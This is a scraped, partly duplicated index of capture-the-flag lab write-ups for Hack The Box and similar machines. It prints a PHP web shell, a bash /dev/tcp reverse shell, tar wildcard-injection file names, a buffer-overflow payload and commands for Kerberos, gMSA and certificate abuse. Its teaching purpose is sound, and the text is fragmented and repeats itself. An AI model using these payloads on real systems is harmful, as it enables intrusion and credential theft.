domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

This time we upload any valid image and then click Transform Image (for example, “crop”), intercepting that request in Burp Suite.\nThe next step is to inject a Reverse Shell into a field that should only contain numbers, so the server executes it and gives us remote access.\nPrivilege escalation to Mark Now that we’re in as the user web, the next step is to run LinPEAS to search for escalation vectors: SUID/weak permissions, credentials in files, misconfigured services, and scheduled tasks we can abuse.\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We find an encrypted backup that could contain credentials or sensitive data from what appears to be the website.\nWe bring it to our local machine and see it was encrypted using pyAesCrypt. To decrypt it we use pyAesDecrypt, which allows a dictionary attack to find the password.\nWe decompress the file and inside find the website backup. When we read db.json this time, it also contains the encrypted password for user mark, so we again use hashcat to crack it.\nhashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt We log in as user Mark and obtain the User Flag.\nPrivilege escalation to Root Running sudo -l shows we can run the binary charcol as root without providing a password.\n","permalink":"http://localhost:1313/writeups/medium/imagery/","summary":"Difficulty: Medium 🟠","title":"Imagery - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/immortal/","summary":"Difficulty: Medium 🟠","title":"Immortal - HackMyVM"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/very-easy/injection/","summary":"Difficulty: Very Easy 🔵","title":"Injection - Dockerlabs"},{"content":"\rMachine Link\nTo find the IP of the victim machine, I use the arp-scan command to discover the devices connected to my local network and locate the one whose** MAC address** starts with 08:, indicating it is a VirtualBox virtual machine.\nsudo arp-scan -I eth0 --localnet Next, we proceed with a quick scan using NMAP to see which ports are open.\nsudo nmap -sS --min-rate 4500 -n -Pn 192.168.18.163 Ports 22 and 80 are open\rAnd now we perform a more detailed scan on those open ports and save the result in a file called target.txt.\nnmap -sCV -p22,80 -n -Pn 192.168.18.163 -oN target.txt Detailed scan of the open ports\rWe observe a website hosted on this machine via port 80, but only the default Nginx homepage is visible.\nI use Gobuster to enumerate hidden files and directories.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

This time we upload any valid image and then click Transform Image (for example, “crop”), intercepting that request in Burp Suite.\nThe next step is to inject a Reverse Shell into a field that should only contain numbers, so the server executes it and gives us remote access.\nPrivilege escalation to Mark Now that we’re in as the user web, the next step is to run LinPEAS to search for escalation vectors: SUID/weak permissions, credentials in files, misconfigured services, and scheduled tasks we can abuse.\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We find an encrypted backup that could contain credentials or sensitive data from what appears to be the website.\nWe bring it to our local machine and see it was encrypted using pyAesCrypt. To decrypt it we use pyAesDecrypt, which allows a dictionary attack to find the password.\nWe decompress the file and inside find the website backup. When we read db.json this time, it also contains the encrypted password for user mark, so we again use hashcat to crack it.\nhashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt We log in as user Mark and obtain the User Flag.\nPrivilege escalation to Root Running sudo -l shows we can run the binary charcol as root without providing a password.\nExecuting it reveals a program for performing backups; there is a shell option where we can run several commands to perform different functions.\nWhen we enter help it lists several commands we can run and a brief explanation of how to use them.\n","permalink":"http://localhost:1313/writeups/medium/imagery/","summary":"Difficulty: Medium 🟠","title":"Imagery - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/immortal/","summary":"Difficulty: Medium 🟠","title":"Immortal - HackMyVM"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/very-easy/injection/","summary":"Difficulty: Very Easy 🔵","title":"Injection - Dockerlabs"},{"content":"\rMachine Link\nTo find the IP of the victim machine, I use the arp-scan command to discover the devices connected to my local network and locate the one whose** MAC address** starts with 08:, indicating it is a VirtualBox virtual machine.\nsudo arp-scan -I eth0 --localnet Next, we proceed with a quick scan using NMAP to see which ports are open.\nsudo nmap -sS --min-rate 4500 -n -Pn 192.168.18.163 Ports 22 and 80 are open\rAnd now we perform a more detailed scan on those open ports and save the result in a file called target.txt.\nnmap -sCV -p22,80 -n -Pn 192.168.18.163 -oN target.txt Detailed scan of the open ports\rWe observe a website hosted on this machine via port 80, but only the default Nginx homepage is visible.\nI use Gobuster to enumerate hidden files and directories.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

